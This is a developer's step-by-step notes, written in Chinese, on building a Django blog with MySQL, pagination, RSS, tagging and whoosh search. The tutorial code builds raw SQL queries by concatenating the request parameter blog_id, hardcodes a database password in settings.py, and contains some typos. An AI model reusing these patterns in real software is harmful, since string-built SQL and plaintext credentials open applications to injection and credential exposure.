# <center>Django MyBlog Develop Note</center> 

## 部署环境

### 环境：python3.7, Django, pip, CentOS7.0, virtualenv, virtualenvwrapper, mysql, nginx

> ### 1. 安装virtualenv

	pip install virtualenv
	
> ### 2. 安装virtualenvwrapper,集成的virtualenv 管理工具

	pip install virtualenvwrapper
>～/.bashrc 中添加如下两行，第一行之后'''mkvirtualenv xxx'''均会在该目录下创建指定名字的目录
	
	export WORKON_HOME=~/django/env-py3
	source /usr/local/anaconda3/bin/virtualenvwrapper.sh

更为详细的virtualenvwrapper可以参考：[virtualevnwrapper使用指南](http://www.cnblogs.com/technologylife/p/6635631.html)

>### 3. 创建虚拟环境，指定python版本为3.7

	virtualenv -p /usr/local/anaconda3/bin/python3.7 myblog
	mkvirtualenv --python=/usr/local/anaconda3/bin/python3.7 myblog

>### 4. 激活虚拟环境：

	work on myblog or source myblog/bin/activate
成功之后命令行前面会有带myblog, 单独work on 是查看当前所有虚拟环境

>### 5. 退出虚拟环境：

	deactivate
>### 6. 安装Django

现在pypi网址已经变了，老版本的pip install可能url是错误的，本地改成了aliyun的源

	pip install django

>### 7. 使用pycharm直接创建django工程。
	
配置interpreter时候，需要选择之前创建的myblog virtualenv的配置

如果不是使用pycharm这种ide创建的话，可以参考:[django通过命令行创建工程](https://blog.csdn.net/weixin_42573907/article/details/80990471)

>### 8. Pycharm中Run

直接run即可，这样子基本的django环境也算是布置完成。

>### 9. 安装mysql，请谨记初次安装随机生成的密码。

用随机密码第一次登陆，我是使用navicat连接mysql，修改密码sql语句：
	
	ALTER USER 'root'@'localhost' IDENTIFIED BY 'xxxxxx';
   
>### 10. 修改setting.py
	DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'myblog',     # 数据库名
        'USER': 'root',       # 用户名
        'PASSWORD': '159426', # 密码
        'HOST': '127.0.0.1',  # 本机地址
        'PORT': '3306',       # 端口
    } 
    
在虚拟环境中安装mysqlclient， 不过这个东西很可能会有bug，具体可以看这个：[stack overflow关于mysqlclient bug](https://stackoverflow.com/questions/43740481/python-setup-py-egg-info-mysqlclient)

	pip install mysqlclient

## 建立第一个app

>创建app

	python manage.py startapp myblog

>修改setting.py中的installed app

	INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'myblog.apps.MyblogConfig', #新加入的app
]

>tree 显示如下：

	[root@izbp1278r1bks38x5f48drz myblog_code]# tree blog/
	blog/
	├── blog
	│   ├── __init__.py
	│   ├── __pycache__
	│   │   ├── __init__.cpython-37.pyc
	│   │   ├── settings.cpython-37.pyc
	│   │   ├── urls.cpython-37.pyc
	│   │   └── wsgi.cpython-37.pyc
	│   ├── settings.py
	│   ├── urls.py
	│   └── wsgi.py
	├── manage.py
	└── myblog   
	    ├── admin.py
	    ├── apps.py
	    ├── __init__.py
	    ├── migrations
	    │   ├── 0001_initial.py
	    │   ├── __init__.py
	    │   └── __pycache__
	    │       ├── 0001_initial.cpython-37.pyc
	    │       └── __init__.cpython-37.pyc
	    ├── models.py
	    ├── __pycache__
	    │   ├── admin.cpython-37.pyc
	    │   ├── apps.cpython-37.pyc
	    │   ├── __init__.cpython-37.pyc
	    │   └── models.cpython-37.pyc
	    ├── tests.py
	    └── views.py

>迁移数据库

	python manage.py makemigrattions
	python manage.py migrate

这个时候会发现myblog 数据库中多了很多内容：

![navicat](https://github.com/Symbii/MY_Blog_Django/blob/master/mysql.png?raw=true)

## 个人主页数据库设计

我们看看这个博客网站需要建立哪些表，每个表中都需要什么字段。

首先，最主要的是我们的博客表，名字可以直接叫做Blog，这个表中，肯定要包括以下几点：

> 博客的标题、
> 博客的内容、
> 博客的发表时间、
> 博客的修改时间、
> 博客的分类、
> 博客的点击量、
> 博客的标签、
> 博客的作者。

针对博客的分类，我们可以参考csdn博客系统，一篇博客只能有一个分类，但是可以有多个标签，比如我现在写的这篇博客，可以分类到django 下，但是它可以有多个标签：django、博客、数据库、开发……

考虑到每一篇博客都只能有一个分类，而一个分类下是可以包含很多博客的，**因此分类与博客是一对多的关系**

此时应当使用外键来进行关联。而一篇博客可以有多个标签， 每个标签也可以包含多个博客，因此，**标签与博客是多对多的关系**。关于一对多与多对多的知识话题，这里就不再展开了，不熟悉的同学可以查看:[django中文官方文档](https://docs.djangoproject.com/zh-hans/2.0/intro/tutorial02/).

因此，通过上述分析，我们可以确定出三个数据表，博客（Blog）、分类（Category）与标签（Tag）。下面在myblog目录下的models.py中创建这三个表，由于Blog表包含外键与多对多关系，因此首先应当建立另外两个表：

	from django.db import models
	from django.utils import timezone
	# Create your models here.
	
	
	class Category(models.Model):
	    """
	    博客分类
	    """
	    name = models.CharField(verbose_name='博客类别', max_length=20)
	    number = models.IntegerField(verbose_name='分类数目', default=1)
	
	    class Meta:
	        verbose_name = '博客类别'
	        verbose_name_plural = verbose_name
	
	    def __str__(self):
	        return self.name
	
	
	class Tag(models.Model):
	    """
	    博客标签
	    """
	    name = models.CharField(verbose_name='博客标签', max_length=20)
	    number = models.IntegerField(verbose_name='标签数目', default=1)
	
	    class Meta:
	        verbose_name = '博客标签'
	        verbose_name_plural = verbose_name
	
	    def __str__(self):
	        return self.name
	
	class Blog(models.Model):
	    """
	    博客
	    """
	    title = models.CharField(verbose_name='标题', max_length=100)
	    content = models.TextField(verbose_name='正文', default='')
	    create_time = models.DateTimeField(verbose_name='创建时间', default=timezone.now)
	    modify_time = models.DateTimeField(verbose_name='修改时间', auto_now=True)
	    click_nums = models.IntegerField(verbose_name='点击量', default=0)
	    category = models.ForeignKey(Category, verbose_name='博客类别', on_delete=models.CASCADE)
	    tag = models.ManyToManyField(Tag, verbose_name='博客标签')
	
	    class Meta:
	        verbose_name = '我的博客'
	        verbose_name_plural = verbose_name
	
	    def __str__(self):
	        return self.title


在修改完moduel.py之后，执行如下命令：
	
	python manage.py makemigrations
	python manage.py migrate

本次自己本地是遇到了一些问题，问题如下：提示缺少```on_delete```参数

问题原因：```models.ForeignKey(Blog, verbose_name='博客', on_delete=models.CASCADE)``` 这个一开始没有给第三个参数，现在要求指定外键的时候，必须指定为级联删除。修改执行成功。并且通过navicat 可以观察到mysql已经生成了指定的表，如下图所示。注意每次修改了moduel.py 都需要执行：
	
	python manage.py makemigrations
	python manage.py migrate

## 在管理界面中添加对应的app中涉及的数据库表单显示

请记住django所有目录下面__init__.py都是空文件，这提示我们这些目录都将作为包被使用，使用``admin.site.register()``这个接口进行注册，这样子就可以在admin后台页面看到对应数据库表单的管理。此处注意，``BlogAdmin.list_displat`` 不能接受多对多的关系，所有如果是多对多的关系是不能添加进去的如models.Blog.tag

	from django.contrib import admin
	from myblog.models import Category, Tag, Blog, Comment, Counts
	
	class BlogAdmin(admin.ModelAdmin):
	    list_display = ['title', 'create_time', 'click_nums', 'category']
	
	# Register your models here.
	admin.site.register(Category)
	admin.site.register(Tag)
	admin.site.register(Blog, BlogAdmin)
	admin.site.register(Comment)
	admin.site.register(Counts)

现在我们已经可以通过后台对网站进行管理，下一步就需要创建，博客首页

## 创建博客首页

>	在myblog目录下面创建一个urls.py,内容如下面所示，这里注意由于我按照官方文档推荐，将projects下面的urlpatterns改为```path('myblog/', include('myblog.urls'))```,所以这里可以看出来我的static和template都可以放在了我myblog这个app的目录里面，这样子有一个好处，如果我想将我这个app移植到别的项目中，就可以直接拷贝这个app目录就可以了：

*project*: **blog/urls.py**

	from django.contrib import admin
	from django.urls import path, include
	
	urlpatterns = [
	    path('myblog/', include('myblog.urls')), 	    path('admin/', admin.site.urls),
	]

当输入网址：‘ip/myblog/’ 的时候会自动照myblog这个包中的urls


*app*: **myblog/urls.py**

	from django.urls import path
	
	from myblog.views import IndexView
	
	urlpatterns = [
	    path('', IndexView.as_view(), name='index'),
	]
	
去除myblog/这段之后为‘’的时候 调用views.py中的IndexView类的as_view方法，as_view方法这里简单说下，它首先会根据http请求方式进行dispatch，然后调用对应的方法：post, get, other,这里目前只调用get,render第三个参数dict类型，这里是获取出Blog类中的全部元素，按照添加前后排倒序，传入到all_blog ,然后通过blog这个queryset在index.html使用，这里主要是为了可以根据数据库中的数据进行显示。

*app*: **myblig/views.py**

	from django.shortcuts import render
	from django.views import View
	from myblog.models import Blog
	# Create your views here.
	
	class IndexView(View):
	    """
	    首页
	    """
	    def get(self, request):
	        all_blog = Blog.objects.all().order_by('-id')
	        return render(request, 'index.html', {"blog": all_blog})

app:myblog下面的目录结构，此处删掉了一些目前还不用的目录下面的显示：

	liaoxindeMacBook-Pro:myblog liaoxin$ tree
	.
	|-- __init__.py
	|-- admin.py
	|-- apps.py
	|-- migrations
	|-- models.py
	|-- static
	|-- templates
	|   |-- 404.html
	|   |-- 500.html
	|   |-- archive.html
	|   |-- base.html
	|   |-- blog-detail.html
	|   |-- index.html
	|   `-- tags.html
	|-- tests.py
	|-- urls.py
	`-- views.py

> 现在我们配置好了首页，下面我们需要想办法加载我们下载的第三方模版

1. 在projects/setting.py中添加如下：

		STATICFILES_DIRS = (
	    os.path.join(BASE_DIR, 'static'),
	)

2. 在index.html 中添加如下

		{% load staticfiles %} 
	
3. 将代码中的css、js以及image路径指定到static文件夹中对应的文件：

		<link href="/static/css_js/jquery.fancybox.css" rel="stylesheet" type="text/css">

4. 在index.html 通过使用类似如下的，根据数据库中的内容显示对应内容：

```
	{% for blog in all_blog %}
	    <article>
	    	{{ blog.title }}   #博客的标题
			{{ blog.create_time|date:'Y-m-d' }}  #博客的发表时间，用装饰器date指定显示格式
			{{ blog.category.name }}  博客的分类
			{{ blog.content }}   博客的内容
	    </article>
	{% endfor %}
```

现在我们就有了样式，同时根据数据库内容，进行显示的首页：

![home](https://github.com/Symbii/MY_Blog_Django/blob/master/home.png?raw=true)


## 利用模版的继承

1. 新建base.html页面

我们在templates下新建一个base.html页面，将index.html页面全部剪切进来。然后在index.html页面中第一行写下如下，即可将base.html页面完全继承过来。

	{% extends 'base.html' %}

2. 在需要根据项目不同定制的地方进行加block的tag起来,必须在base页面中原来的位置进行

	```{% block xxx %}```
	此处内容请在index.html 添加
	```{% endblock %}```

3.	在index.html 页面中进行定义 blocktag
	```{% block xxx %}```
	替换base中对应block的内容
	```{% endblock %}```

## 创建分页效果

1. 采用django-pure-pagination这个包，实现分页效果：

	`pip intall django-pure-pagination`

2. 装好之后看pypi.org里面包的使用说明，这里我只想说一句Fxxk，这里作者自己写的需要在setting.py里面设置install_apps,但是这个包装完之后是在lib目录下的，所以根本不需要在install_apps添加的，我一度以为需要手动创建这个app[坑]，但是任然需要设置PAGINATION_SETTINGS的：

```
	PAGINATION_SETTINGS = {
	    'PAGE_RANGE_DISPLAYED': 3,    #中间显示的个数，中间和两边之间其他的以省略号显示
	    'MARGIN_PAGES_DISPLAYED': 2,  #靠近上一页和下一页两边显示的个数 
	    'SHOW_FIRST_PAGE_WHEN_INVALID': True,
	}
```

3. 上面做完之后，就可以设置视图方法和修改index.html了，将IndexView类的get方法改为：

```
	class IndexView(View):
	    """
	    首页,继承view，as_view()自动根据请求，调用对应的方法
	    """
	    def get(self, request):
		all_blog = Blog.objects.all().order_by('-id')

		try:
		    page = request.GET.get('page', 1)
		except PageNotAnInteger:
		    page = 1

		#设置每页只显示一篇，生成paginator对象
		p = Paginator(all_blog, 1, request=request)

		#根据之前的到1-based page， 生成分页好的page对象
		all_page_blog = p.page(page)

		#将分页好的page对象传入index.html
		return render(request, 'index.html', {"blog": all_page_blog})
```        
这里贴一部分从lib中看到的paginator源码，帮助理解上面我写的：
    
	class Paginator(object):
		def __init__(self, object_list, per_page, orphans=0, allow_empty_first_page=True, request=None):
			self.object_list = object_list
			self.per_page = per_page
			self.orphans = orphans
			self.allow_empty_first_page = allow_empty_first_page
			self._num_pages = self._count = None
			self.request = request
		def page(self, number):
			"Returns a Page object for the given 1-based page number."
			number = self.validate_number(number)
			bottom = (number - 1) * self.per_page
			top = bottom + self.per_page
			if top + self.orphans >= self.count:
				top = self.count
			return Page(self.object_list[bottom:top], number, self)

分页效果如下图所示：

![](https://github.com/Symbii/MY_Blog_Django/blob/master/my_page.png?raw=true)


##  实现博客阅读全文的功能

 > 可以看到模版文件	``index.html``,阅读全文是一个链接，我们必须通过正确的url将其指向正确的视图函数。
 	首先这个url不再是一个具体的，它必然是一个系列，并且利用django的router特性:topython, tourl.
 	
 	django中匹配正则表达式：(?P<blog_id>\d+)$ 
 
> 在django中url里面正则表达式按照上诉格式写，它代表的含义是 用\d+去赋值给blog_id，
> 所以urls里面的实现，我们的阅读全文的urlpatterns链接，应为：

	re_path(r"blog/(?P<blog_id>\d+)$", blogdetail.as_view(), name="blogid")	
 > view里面的实现，通过urls的router topython，blog_id这个可以获取到blogid，视图函数必须使用blog_id这个座位参数，才能获取到。

		class BlogDetailView(View):
	    """
	    博客详情页
	    """
	    def get(self, request, blog_id):
	        blog = Blog.objects.get(id=blog_id)
	        return render(request, 'blog-detail.html', {
	            'blog': blog,
	        })
 
>这样子我们就可以在blog—detail页面中显示blog的详细内容，为了获取到blog下的全部标签内容：
	
	from django.db import connection
	 
	cursor = connection.cursor()
	#获取标签名字，采用sql语句获取 ，也可以直接blog.tag.all
	sql_cmd = "select tag_id from myblog_blog_tag where blog_id = {0};".format(blog_id)
	cursor.execute(sql_cmd)
	#注意row_tag_id是多维元组
	row_tag_id = cursor.fetchall()
	for row_each_tag in row_tag_id: 
	    sql_cmd = "select name from myblog_tag where id = {0};".format(row_each_tag[0])
	    cursor.execute(sql_cmd)
	    row_each_name = cursor.fetchone()
	    tag_names.append(row_each_name[0])
 
 > 模版index.html实现，我们的页面最开始是在index中的内容，这样子我们在index页面上要访问到blog详情页面就必须想办法根据正确的url跳转到对应blog的正确页面。我们根据数据库blog表添加时候的id进行传值，然后在上面的视图函数中获取到对应的一篇博客内容。```blogid```这个在这里时候就体现出来tourl的特性，他就是之前那个url的别名，可供模版中使用。
	 
	<div class="post-button text-center">
		<a class="btn" href="{% url 'blogid' each_blog.id %}" rel="contents">
		阅读全文 »
		</a>
	</div>

> 这里最开始视图函数并不是 使用django orm这类进行数据库操作，直接使用的是执行sql语句：

	import django.db import connection
	cursor = connection.cursor()
	sql_cmd = "select * from Blog where id=" + blog_id + ";"
	cursor.execute(sql_cmd)
	blog_row = cursor.fetchone() or cursor.fetchall()

这样子获取到的是一个元组，可以print（）看下具体内容，blog_row[:] 每一个对应数据库中一个column


## 实现归档功能

> 归档功能主要是显示：目前整个blog中一共有多少篇文章，每年有多少篇文章，每篇文章的发表时间和标题。

> 新增加blog统计数据表，记录博客的文章总数，标签总数，分类等等。models.py修改：

	class Counts(models.Model):
    """
    统计博客、分类和标签的数目
    """
    blog_nums = models.IntegerField(verbose_name='博客数目', default=0)
    category_nums = models.IntegerField(verbose_name='分类数目', default=0)
    tag_nums = models.IntegerField(verbose_name='标签数目', default=0)
    visit_nums = models.IntegerField(verbose_name='网站访问量', default=0)
    
    class Meta:
        verbose_name = '数目统计'
        verbose_name_plural = verbose_name
     
		 def __str__(self):
		     return "文章数目:{0}, 类别数目:{1}，标签数目:{2}， 点击量:{3}".format(self.blog_nums, 
		     self.category_nums, self.tag_nums, self.visit_nums)
    
> admin.py中我们给blogadmin新增加，2个方法：save_model 和 delete_model方法在blog增加、删除时候更新Counts表。

	def save_model(self, request, obj, form, change):
        obj.save()
        #统计博客数目
        blog_nums = Blog.objects.count()
        try:
            count_nums = Counts.objects.get()
            count_nums.blog_nums = blog_nums
        except Counts.DoesNotExist:
            count_nums = Counts()
            count_nums.blog_nums = blog_nums
        finally:
	         count_nums.save()
	
	def delete_model(self, request, obj):
	    # 统计博客数目
	    blog_nums = Blog.objects.count()
	    count_nums = Counts.objects.get()
	    count_nums.blog_nums = blog_nums - 1
	    count_nums.save()
	    obj.delete()

> 在视图方法中添加：

	class ArchiveView(View):
    """
    归档
    """
    def get(self, request):
        #按照时间归档
        Archive = Blog.objects.all().order_by("-create_time")

        # 博客、标签、分类数目统计
        count_nums = Counts.objects.get()
        blog_nums = count_nums.blog_nums
        cate_nums = count_nums.category_nums
        tag_nums = count_nums.tag_nums

        try:
            page = request.GET.get('page', 1)
        except PageNotAnInteger:
            page=1
        
        p = Paginator(Archive, 5, request=request)
        all_page_archive = p.page(page)

        return render(request, "archive.html", {
            "all_archive":all_page_archive,
            "blog_nums" : blog_nums
        })

> 在模版archive中添加，这里使用regroup 根据年份进行归档：
	
	{% regroup all_archive.object_list by create_time.year as dates_by_year %}
	
	{% for year in dates_by_year %}
	<div class="collection-title">
	<h2 class="archive-year motion-element" id="archive-year-2018" 
	style="opacity: 1; display: block; transform: translateX(0px);">{{ year.grouper }}</h2>
	</div>
	{% for blog in year.list %}
	<article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article" 
	style="opacity: 1; display: block; transform: translateY(0px);">
	<header class="post-header">
	
	<h1 class="post-title">
	<a class="post-title-link" href="{% url 'blog_id' blog.id %}" itemprop="url">
	    <span itemprop="name">{{ blog.title }}</span>
	</a>
	</h1>
	
	<div class="post-meta">
	<time class="post-time" itemprop="dateCreated" datetime="2017-09-01T20:05:18+08:00" 
	content="2017-09-01">
	{{ blog.create_time|date:"m-d" }}
	</time>
	</div>
	
	</header>
	</article>
	{% endfor %}
	{% endfor %}

## 博客支持markdown显示

> 安装markdown包

	pip install markdown

> 对博客content数据进行markdown渲染

views.py:

    #all_blog加markdown样式
    for blog in all_blog:
        blog.content = markdown.markdown(blog.content)

## 标签云实现

> 数据来源tag表，tag与blog是多对多的关系，需要反向查询每个tag 在blog中的次数，统计出每个tag的总的数量。同时根据tag表刷新counts表。


admin.py，blogAdmin，save_model方法:

	 #博客标签数目统计
    obj_tag_list = obj.tag.all()
    for obj_tag in obj_tag_list:
        #多对多关系，反向查询
        tag_number = obj_tag.blog_set.count()
        obj_tag.number = tag_number
        obj_tag.save()
    
    #counts表刷新，标签数据
    tag_nums = Tag.objects.count()
    count_nums.tag_nums = tag_nums
	
> 剩下的就是通过view函数将对应数据库中的内容传递给模版

	class TagView(View):
    """
    博客标签综述
    """
    def get(self, request):
        all_tags = Tag.objects.all()

        # 博客、标签、分类数目统计
        count_nums = Counts.objects.get()
        blog_nums = count_nums.blog_nums
        cate_nums = count_nums.category_nums
        tag_nums = count_nums.tag_nums

        return render(request, 'tags.html', {
            'tags': all_tags,
            'tag_nums': tag_nums,
            'blog_nums': blog_nums,
            "cate_nums" : cate_nums,    
        })

> urls对应path('tags/', TagView.as_view(), name='tags'),

> 模版文件tags.html,增加按照对应tag次数统计进行不同style显示

    {% for tag in tags %}
         <a href="{% url 'tag_name' tag.name %}"
           {% if tag.number <= 2 %}
                style="font-size: 12.5px; color: #999"
           {% elif tag.number <= 5 %}
                style="font-size: 15px; color: #666"
           {% elif tag.number <= 10 %}
                style="font-size: 20px; color: #444"
           {% elif tag.number <= 20 %}
                style="font-size: 25px; color: #222"
           {% elif tag.number <= 50 %}
                style="font-size: 30px; color: #111"
           {% else %}
                style="font-size: 35px; color: #000"
           {% endif %}>
	
           {{ tag.name }}
        </a>
    {% endfor %}

## 按照标签分类所有博文

> 页面url和之前blog-detail一样

	re_path(r"tags/(?P<tag_name>\w+)$", TagDetailView.as_view(), name= "tag_name")

> 在所有页面中，有关tag的href添加类似：

	href="{% url 'tag_name' tag.name %}"

> TagDetailView类实现：

添加根据tag_name 获取所有blog：

	    def get(self, request, tag_name):
        tag = Tag.objects.filter(name=tag_name).first()
        tag_blogs = tag.blog_set.all()
        tag_blog_nums = tag.blog_set.count()

        # 分页
        try:
            page = request.GET.get('page', 1)
        except PageNotAnInteger:
            page = 1

        p = Paginator(tag_blogs, 5, request=request)
        tag_blogs = p.page(page)
        return render(request, 'tag-detail.html', {
            'tag_blogs': tag_blogs,
            'tag_name': tag_name,
            'tag_blog_nums': tag_blog_nums,
        })
        
> 模版文件tag-detail

	{% for blog in tag_blogs.object_list %}
	<article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article" 
	style="opacity: 1; display: block; transform: translateY(0px);">               
    <header class="post-header">
	<h1 class="post-title">
	<a class="post-title-link" href="{% url 'blog_id' blog.id %}" itemprop="url">
	<span style="padding-left:20px;" itemprop="name">{{ blog.title }}</span>
	</a>
	</h1>
	<div class="post-meta">
	<time class="post-time" itemprop="dateCreated" datetime="2017-09-01T20:05:18+08:00" 
	content="2017-09-01">
	{{ blog.create_time|date:"y-m-d" }}
	</time>
	</div>
	</header>
	</article>
	{% endfor %}


## 增加RSS功能

1.新建feeds.py，这里利用reverse函数获取到url地址，请尽量多使用reverse 和 在模版中使用url标签，这样子可以避免网址变更产生的繁琐修改等等。有关django的feed类可以查询：[django官方文档关于Feed介绍](https://docs.djangoproject.com/zh-hans/2.0/_modules/django/contrib/syndication/views/)
	
	from django.contrib.syndication.views import Feed
	from django.urls import reverse
	from myblog.models import Blog

	class BlogRssFeed(Feed):
	    title = "温文尔雅阁"
	    link = "/rss/"
	    def items(self):
	        return Blog.objects.all()
	    def item_title(self, item):
	        return item.title
	    def item_description(self, item):
	        return item.content
	    def item_link(self, item):
	        return reverse('blog_id', args=[item.id,])

2.urls.py中添加：

	from myblog.feeds import BlogRssFeed
	re_path(r'^rss/$', BlogRssFeed(), name='rss'),

3.模版文件base.html
	
	<div class="feed-link motion-element">
		<a href="{% url 'rss' %}" rel="alternate">
		<i class="fa fa-rss"></i>
		RSS
		</a>
	</div>

## 增加分类归档功能

1.url配置

	re_path(r'^category/(?P<category_name>\w+)$', CategoryDetailView.as_view(), name='category_name'),

2.view配置

	class CategoryDetailView(View):
    """
    博客分类下所包含的博客文章
    """
    def get(self, request, category_name):
        category = Category.objects.filter(name=category_name).first()
        category_blogs = category.blog_set.all()
        category_blog_nums = category.blog_set.count()

        # 博客、标签、分类数目统计
        count_nums = Counts.objects.get()
        blog_nums = count_nums.blog_nums
        cate_nums = count_nums.category_nums
        tag_nums = count_nums.tag_nums

        # 分页
        try:
            page = request.GET.get('page', 1)
        except PageNotAnInteger:
            page = 1

        p = Paginator(category_blogs, 5, request=request)
        category_blogs = p.page(page)
        return render(request, 'category-detail.html', {
            'category_blogs': category_blogs,
            'category_name': category_name,
            'category_blog_nums': category_blog_nums,
            'tag_nums': tag_nums,
            'blog_nums': blog_nums,
            "cate_nums" : cate_nums,  
        })
 
 3.模版可以参考tag-detail做相应修改就可以，这里就不多描述了
 

## 增加搜索功能&添加自定义标签和过滤器

>安装必要的包：

	pip install whoosh django-haystack jieba

这里注意一点whoosh默认的是英文分词，这里需要使用jieba中文分词

> 配置setting.py,有关django-haystack更为详细的教程，可以参考官方文档：[django-haystack官方文档](https://django-haystack.readthedocs.io/en/latest/tutorial.html)

	INSTALLED_APPS = [
		 ...
	    'haystack',                 #搜索工具
	    'pure_pagination',          #分页工具
	    'myblog.apps.MyblogConfig', #新加入的app
	    'myblog.templatetags'       #自定义模版标签和过滤器
	]
	
	HAYSTACK_CONNECTIONS = {
	    'default': {
	        'ENGINE': 'blog.whoosh_cn_backend.WhooshEngine',
	        'PATH': os.path.join(BASE_DIR, 'whoosh_index'),
	    },
	}
	HAYSTACK_SEARCH_RESULTS_PER_PAGE = 10
	HAYSTACK_SIGNAL_PROCESSOR = 'haystack.signals.RealtimeSignalProcessor'

这里先提前说一下```blog.whoosh_cn_backend.WhooshEngine``` 这个是我们自定义的中文分词，主要是为了不修改whoosh的源码，将其拷贝出来一份文件，然后手动修改一部分。

> 处理数据，给搜索创建索引，在对应的app目录下面创建search_indexes.py文件名不得修改。

	from haystack import indexes
	from myblog.models import Blog
	import markdown
	
	 #类名必须为需要检索的Model_name+Index，这里需要检索Blog，所以创建BlogIndex  
	class BlogIndex(indexes.SearchIndex, indexes.Indexable):
	    text = indexes.CharField(document=True, use_template=True)
	
		 #重载get_model方法，必须要有
	    def get_model(self):
	        return Blog
	        
		#重载index_..函数 
	    def index_queryset(self, using=None):
	        return self.get_model().objects.all()


 1. 每个索引里面必须有且只能有一个字段为```document=True```，这代表haystack 和搜索引擎将使用此字段的内容作为索引进行检索(primary field)。其他的字段只是附属的属性，方便调用，并不作为检索数据。如果使用一个字段设置了```document=True```，则一般约定此字段名为text，这是在SearchIndex类里面一贯的命名，以防止后台混乱，当然名字你也可以随便改，不过不建议改。

 2. haystack提供了```use_template=True```在text字段，这样就允许我们使用数据模板去建立搜索引擎索引的文件，说得通俗点就是索引里面需要存放一些什么东西，例如 Blog 的 title 字段，这样我们可以通过 title 内容来检索 Blog 数据了，举个例子，假如你搜索 python ，那么就可以检索出含有title含有 python 的Blog了， 数据模板的路径为```templates/search/indexes/youapp/\<model_name>_text.txt```,数据模版内容：
 
 
	 	{{ object.title }}
		{{ object.content }}
 
 这个数据模板的作用是对 Blog.title、Blog.body 这两个字段建立索引，当检索的时候会对这两个字段做全文检索匹配，然后将匹配的结果排序后作为搜索结果返回。
 	
> 配置url

	path('search/', include('haystack.urls')),

>将base中的搜索表单修改

	<form action="{% url 'haystack_search' %}">
     <input id="unit" type="search" name="q" placeholder="搜索">
	</form>

>模版文件search.html修改

	{% load extra_tags %}
	
	{% for blog in page.object_list %}
    <div>
        <a href="{% url 'blog_id' blog.object.id %}">
            <h3>{{ forloop.counter }}、{% myhighlight blog.object.title with query max_length 100 start_head True %}</h3>
        </a>

        <div style="word-wrap: break-word">
            {% myhighlight blog.object.content with query max_length 100 start_head True %}
        </div>


        {% if forloop.counter == page.object_list|length %}
            {% else %}
            <hr>
        {% endif %}
    </div>
	{% empty %}
	    <div class="no-post">没有搜索到相关内容，请重新搜索</div>
	{% endfor %}

这里使用自定义的标签myhighlight，更为详细的介绍可以参考我另外一篇文章：[Django添加自定义标签和过滤器](http://www.liaoxin.online:5001/myblog/blog/15)

> 使用中文分词器

前面我们使用```blog.whoosh_cn_backend.WhooshEngine```,这个是我们从haystack中把 haystack/backends/whoosh_backends.py拷贝到blog目录下，然后将其改名为whoosh_cn_backend，并且将下面这行代码中的分词改为中文分词

	schema_fields[field_class.index_fieldname] = TEXT(stored=True, analyzer=StemmingAnalyzer(), field_boost=field_class.boost, sortable=True)

将StemmingAnalyzer改为ChineseAnalyzer，为了使用ChineseAnalyzer，需要导入jieba分词

	from jieba.analyse import ChineseAnalyzer

> 最后一步就是给已经写过的文章建立索引：

	python manage.py rebuild_index

现在去试试搜索吧

## Django添加自定义标签和过滤器

> 建立一个templatetags目录, 在里面写自定义的标签和过滤器，通过```register.filter``` 和 ```register.tag``` 注册自己的过滤器和标签

> 本项目建立2个文件 ```extra_tag.py``` 和 ```highlighting.py``` 

> extra_tag.py中部分有关myhighlight同样拷贝自haystack的templatetag中，添加了一个参数```start_head```, 默认为False,设置之后为True:

	from __future__ import absolute_import, division, print_function, unicode_literals    
	from django import template
	from django.conf import settings  
	from django.core.exceptions import ImproperlyConfigured  
	from django.utils import six  
	  
	from haystack.utils import importlib  
	import markdown
	register = template.Library()
	
	@register.filter(name='mymarkdown')  # 过滤器在模板中使用时的name
	def mymarkdown(value):               # 这里还可以通过arg把传递过来的参数arg给过滤器添加参数
	   return markdown.markdown(value)   

	class HighlightNode(template.Node):  
	    def __init__(self, text_block, query, html_tag=None, css_class=None, max_length=None, start_head=None):  
	        self.text_block = template.Variable(text_block)  
	        self.query = template.Variable(query)  
	        self.html_tag = html_tag  
	        self.css_class = css_class  
	        self.max_length = max_length  
	        self.start_head = start_head  
	  
	        if html_tag is not None:  
	            self.html_tag = template.Variable(html_tag)  
	  
	        if css_class is not None:  
	            self.css_class = template.Variable(css_class)  
	  
	        if max_length is not None:  
	            self.max_length = template.Variable(max_length)  
	  
	        if start_head is not None:  
	            self.start_head = template.Variable(start_head)  
	  
	    def render(self, context):  
	        text_block = self.text_block.resolve(context)  
	        query = self.query.resolve(context)  
	        kwargs = {}  
	  
	        if self.html_tag is not None:  
	            kwargs['html_tag'] = self.html_tag.resolve(context)  
	  
	        if self.css_class is not None:  
	            kwargs['css_class'] = self.css_class.resolve(context)  
	  
	        if self.max_length is not None:  
	            kwargs['max_length'] = self.max_length.resolve(context)  
	  
	        if self.start_head is not None:  
	            kwargs['start_head'] = self.start_head.resolve(context)  
	  
	        # Handle a user-defined highlighting function.  
	        if hasattr(settings, 'HAYSTACK_CUSTOM_HIGHLIGHTER') and settings.HAYSTACK_CUSTOM_HIGHLIGHTER:  
	            # Do the import dance.  
	            try:  
	                path_bits = settings.HAYSTACK_CUSTOM_HIGHLIGHTER.split('.')  
	                highlighter_path, highlighter_classname = '.'.join(path_bits[:-1]), path_bits[-1]  
	                highlighter_module = importlib.import_module(highlighter_path)  
	                highlighter_class = getattr(highlighter_module, highlighter_classname)  
	            except (ImportError, AttributeError) as e:  
	                raise ImproperlyConfigured("The highlighter '%s' could not be imported: %s" % (settings.HAYSTACK_CUSTOM_HIGHLIGHTER, e))  
	        else:  
	            from .highlighting import Highlighter  
	            highlighter_class = Highlighter  
	  
	        highlighter = highlighter_class(query, **kwargs)  
	        highlighted_text = highlighter.highlight(text_block)  
	        return highlighted_text  
	 
	 
		@register.tag(name='myhighlight')  
		def myhighlight(parser, token):  # parse解析器对象，token被解析的对象，包含标签的名字和格式化的格式
		    """ 
		    Takes a block of text and highlights words from a provided query within that 
		    block of text. Optionally accepts arguments to provide the HTML tag to wrap 
		    highlighted word in, a CSS class to use with the tag and a maximum length of 
		    the blurb in characters. 
		 
		    Syntax:: 
		 
		        {% myhighlight <text_block> with <query> [css_class "class_name"] [html_tag "span"] [max_length 200] [start_head True] %} 
		 
		    Example:: 
		 
		        # Highlight summary with default behavior. 
		        {% highlight result.summary with request.query %} 
		 
		        # Highlight summary but wrap highlighted words with a div and the 
		        # following CSS class. 
		        {% highlight result.summary with request.query html_tag "div" css_class "highlight_me_please" %} 
		 
